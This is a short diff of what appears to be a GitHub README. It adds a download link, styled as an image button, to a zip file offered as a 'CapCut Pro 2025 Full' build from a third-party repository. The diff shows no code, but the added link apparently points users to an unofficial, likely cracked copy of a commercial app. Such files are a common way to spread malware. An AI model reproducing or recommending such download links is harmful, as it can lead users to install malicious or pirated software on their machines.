@@ -21,7 +21,7 @@
 ## ⬇️ Download:
 
 
-
+[![image](https://github.com/user-attachments/assets/220c6965-471b-453e-82b3-7ac97ad5a2aa)](https://github.com/Lowechain/CapCut-Pro-2025-Full/releases/download/download/Capcut-pro.zip)
 
 
 ## 🔧 Installation:
